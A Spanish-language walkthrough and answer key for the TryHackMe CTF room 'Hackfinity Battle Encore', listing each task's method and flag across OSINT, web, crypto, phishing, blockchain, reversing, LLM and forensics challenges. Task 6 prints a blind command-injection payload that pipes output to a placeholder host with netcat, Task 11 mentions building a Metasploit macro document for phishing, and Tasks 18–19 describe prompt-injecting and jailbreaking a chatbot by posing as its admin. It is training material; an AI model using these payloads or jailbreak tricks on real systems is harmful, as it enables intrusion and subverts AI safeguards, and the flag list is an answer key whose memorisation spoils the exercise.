# Hackfinity Battle Encore

| **Dificultad** | MEDIUM | **Tipo** | CTF (Walkthrough) | **Slug** | `HackfinityBattleEncore` |
| **Link** | [TryHackMe](https://tryhackme.com/room/HackfinityBattleEncore) | **Sección** | 02 Level Medium | **Fuente** | texto oficial THM + anotaciones propias |
| **Componentes** | OSINT / Web / Crypto / Forensics / Reversing / Game Hacking / Blockchain / LLM / AI / Phishing | **Impacto** | Evalúa habilidades CTF integrales con categorías variadas en un evento de competición |

---

**Contexto:** Re-lanzamiento ("Encore") del CTF **Hackfinity Battle** de TryHackMe. CTF muy completo que abarca categorías como OSINT, Web, Cryptografía, Forense (DFIR), Reversing, Game hacking y Blockchain/smart contracts. Da la oportunidad de resolver desafíos que se perdieron en el evento original o refrescar habilidades. Sala **Free** (gratuita). Nota: algunas tareas dinámicas (lab/IP) pueden variar; esta sala contiene una gran cantidad de tareas repartidas en categorías. Fuentes principales: motasem-notes.net, ehxb.medium.com (parte 1 y 2).

## Solucionario

### Task 1: OSINT — Catch Me if You Can

**Explicación:** La foto proporcionada contiene una pista del restaurante del que salieron Cipher y Specter; la flag es su nombre. Formato de flag: `THM{restaurant_name}` (minúsculas, guiones bajos en lugar de espacios).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de Catch Me if You Can | `THM{coringa_do_beco}` |

### Task 2: OSINT — Catch Me if You Can 2

**Explicación:** La imagen de CCTV contiene un texto cifrado que Cipher usó para comunicar una ubicación. Usar ExifTool para verificar y comparar con la imagen original; el texto cifrado es **Pigpen cipher** (descodificar con dcode.fr / PlanetCalc). El mensaje decodificado es algo como "meet at THM tori portal".

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de Catch Me if You Can 2 | `THM{tori_portal}` |

### Task 3: OSINT — Catch Me if You Can 3

**Explicación:** Encontrar la dirección completa del "safe house" de Mr. Wok en São Paulo, Brasil. Formato de flag: `THM{streetnumber_street_name}` (minúsculas, sin símbolos especiales). La dirección es `Rua Galvão Bueno, 83`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de Catch Me if You Can 3 | `THM{83_galvao_bueno}` |

### Task 4: Web — Notepad Online

**Explicación:** Aplicación de notas vulnerable a **IDOR**. Manipular el parámetro `note_id` de la URL (1, 2, 3... y valores más bajos / 0) para acceder a notas ocultas.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de Notepad Online | `THM{i_can_see_your_notes}` |

### Task 5: Web — Dark Encryptor

**Explicación:** Herramienta de cifrado PGP alojada en un servidor. Interceptar la petición con Burp Suite (Repeater) y probar **command injection** en la petición para obtener la flag.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de Dark Encryptor | `THM{pgp_cant_stop_me}` |

### Task 6: Web — Dark Encryptor 2

**Explicación:** Similar a Dark Encryptor pero con inyección **a ciegas** (blind command injection) en el campo recipient/método de cifrado. Ejemplo de payload exfiltrando con netcat: `$(ls | nc Your-IP Your-Port)` y luego `cat` para leer la flag.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de Dark Encryptor 2 | `THM{going_in_bl1nd_2394}` |

### Task 7: Crypto — Order

**Explicación:** Descifrar un mensaje cifrado con **repeating-key XOR**. Como cada mensaje empieza con `ORDER:`, usar un known-plaintext attack para recuperar la key y descifrar.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de Order | `THM{the_hackfinity_highschool}` |

### Task 8: Crypto — Dark Matter

**Explicación:** Espacio con ransomware pidiendo una decryption key. En `/tmp` está `public_key.txt` con `n` y `e` de RSA (n pequeño, factorizable). Factorizar `n` para obtener `p`, `q` y `d` (por ej. dcode.fr) e introducir `d` como clave.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de Dark Matter | `THM{d0nt_l34k_y0ur_w34k_m0dulu5}` |

### Task 9: Crypto — Cipher's Secret Message

**Explicación:** Mensaje cifrado con cifrado de desplazamiento basado en la posición (position-based shift cipher). Cada carácter se desplaza por su índice `i`. Escribir un script de decriptado que reste la posición con `mod 26` preservando mayúsculas/minúsculas.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de Cipher's Secret Message | `THM{a_sm4ll_crypt0_message_to_st4rt_with_THM_cracks}` |

### Task 10: Crypto — Cryptosystem

**Explicación:** Mensaje cifrado con RSA donde `q` es el primo siguiente a `p`, por lo que `p` está cerca de `sqrt(n)`. Buscar `p` cerca de la raíz cuadrada de `n`, calcular `phi(n)=(p-1)(q-1)`, obtener `d` (modular inverse) y descifrar.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de Cryptosystem | `THM{Just_s0m3_small_amount_of_RSA!}` |

### Task 11: Phishing / Social Engineering — Ghost Phishing

**Explicación:** Desafío de phishing: crear un documento Word malicioso (macro) con Metasploit para enviarlo de un correo comprometido a Cipher.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de Ghost Phishing | `THM{gh0st_ph1sh1ng_exp0s3d}` |

### Task 12: Phishing — Shadow Phishing

**Explicación:** Desafío de phishing por email.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de Shadow Phishing | `THM{3m41l_ph1sh1ng_1s_3z}` |

### Task 13: Phishing — Shadow Phishing 2

**Explicación:** Desafío de phishing por email (nivel 2).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de Shadow Phishing 2 | `THM{3m41l_ph1sh1ng_1s_n0t_s0_3z}` |

### Task 14: Blockchain — PassCode

**Explicación:** Smart contract (Ethereum) donde se manipulan contratos con comandos `cast`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de PassCode | `THM{web3_h4ck1ng_code}` |

### Task 15: Blockchain — Heist

**Explicación:** Smart contract takeover: llamar a `changeOwnership()` sin chequeos y luego `withdraw()` para transferir fondos.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de Heist | `THM{web3_h31st_d0ne}` |

### Task 16: Reversing / Game Hacking — The Game

**Explicación:** Reversing de Godot: extraer archivos del proyecto, localizar el umbral de puntuación y bajarlo (editar `.gd`) para revelar flags.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de The Game | `THM{I_CAN_READ_IT_ALL}` |

### Task 17: Reversing / Game Hacking — The Game v2

**Explicación:** Reversing de Godot nivel 2: manipulación de memoria/scripts para revelar la flag.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de The Game v2 | `THM{MEMORY_CAN_CHANGE_4R34L$-$}` |

### Task 18: LLM / AI — Evil-GPT

**Explicación:** Chatbot LLM; en lugar de comandos Linux hay que inyectar **prompts** para que el LLM ejecute comandos y leer el flag de root.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de Evil-GPT | `THM{AI_HACK_THE_FUTURE}` |

### Task 19: LLM / AI — Evil-GPT v2

**Explicación:** Jailbreak de un chatbot LLM; hacer prompt injection fingiendo ser admin/creador y evitando keywords como "flag".

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de Evil-GPT v2 | `THM{AI_NOT_AI}` |

### Task 20: Forensics / DFIR — Dump

**Explicación:** Analizar un **LSASS dump** de mimikatz, extraer usuarios con sus NTML hashes y usar `evil-winrm` para conectarse y encontrar el usuario con acceso al Desktop de Administrador (flag.txt).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de Dump | `THM{1nj3ctBr34k3r5}` |

### Task 21: Forensics — Hide and Seek

**Explicación:** Forense Linux/DFIR: analizar archivos modificados alrededor de una fecha, servicios (motd `/etc/update-motd.d/00-header`), `.bashrc` y `authorized_keys` para reconstruir la flag en partes.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Flag de Hide and Seek | `THM{y0u_g0t_3v3ryth1ng_d0wn}` |

### Task 22: Otras tareas (flags verificadas)

**Explicación:** Flags verificadas de fuentes públicas para el resto de tareas del evento. Las tareas dinámicas que requieren acceder a un lab (por ejemplo "Avengers Hub", "Serverless", "Ghost Phishing") tienen pasos de resolución detallados en los writeups de Motasem Hamdan y Djalil Ayed; las flags aquí documentadas son las verificadas en dichas fuentes públicas.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Stolen Mount | `THM{n0t_s3cur3_f1l3_sh4r1ng}` |
| 2 | Infinity Shell | `THM{sup3r_34sy_w3bsh3ll}` |
| 3 | Sneaky Patch | `THM{sup3r_sn34ky_d00r}` |
| 4 | Sequel Dump | `THM{r3tr13v1ng_th3_dump}` |
| 5 | Flag Vault | `THM{password_0v3rfl0w}` |
| 6 | Flag Vault 2 | `THM{format_issues}` |
| 7 | Cloud Sanity Check | `THM{for_your_eyes_only}` |
| 8 | A Bucket of Phish | `THM{this_is_not_what_i_meant_by_public}` |
| 9 | Encrypted Data | `THM{crypto_cloud_conundrum}` |
| 10 | Compute Magic | `THM{s0m3_mag1c_that_can_b3_computed}` |
| 11 | Old Authentication | `THM{just_a_simple_encryption_for_you_to_r3}` |
| 12 | Void Execution | `THM{a_void_in_the_memory_c0de}` |

---

**Metodología:**
1. Reconocer categorías del CTF (OSINT, Web, Crypto, Forensics, Reversing, Game Hacking, Blockchain, LLM/AI, Phishing).
2. OSINT: análisis EXIF, Pigpen cipher, reverse image search y geolocalización de direcciones.
3. Web: IDOR en parámetros `note_id`, Burp Suite Repeater, comand injection directo y ciego.
4. Crypto: known-plaintext attack para repeating-key XOR, factorización de RSA (n pequeño), shift cipher posicional y RSA con primos próximos.
5. Phishing: macros de Word con Metasploit y campañas de email.
6. Blockchain: interacción con smart contracts vía `cast` y takeover sin chequeos.
7. Reversing/Game Hacking: extraer proyecto Godot, editar umbrales `.gd` y manipular memoria.
8. LLM/AI: prompt injection y jailbreaks en chatbots.
9. Forensics/DFIR: análisis de LSASS dump de mimikatz y evil-winrm; revisión de motd, .bashrc y authorized_keys.
10. Consolidar flags verificadas de writeups públicos.

**Learning chain:** OSINT (Exif/Pigpen/geoloc) → Web (IDOR/command injection) → Crypto (XOR/RSA/shift) → Phishing (macro/email) → Blockchain (cast/smart contracts) → Reversing (Godot/memoria) → LLM/AI (prompt injection/jailbreak) → DFIR (LSASS/mimikatz/evil-winrm) → Hide and Seek (motd/.bashrc/authorized_keys) → otras flags

**Lección:** *Un CTF integral como Hackfinity Battle Encore exige tener un toolbox amplio: la misma sesión mezcla OSINT, web, crypto, forense, reversing, web3 y LLM hacking; la rapidez para pivotar de categoría y validar con fuentes públicas marca la diferencia.*

**MITRE ATT&CK:** T1190 - Exploit Public-Facing Application; T1059 - Command and Scripting Interpreter; T1003 - OS Credential Dumping; T1204 - User Execution; T1566 - Phishing; T1649 - Steal or Forge Authentication Certificates; T1055 - Process Injection

**Fuente:** [TryHackMe - Hackfinity Battle Encore](https://tryhackme.com/room/HackfinityBattleEncore)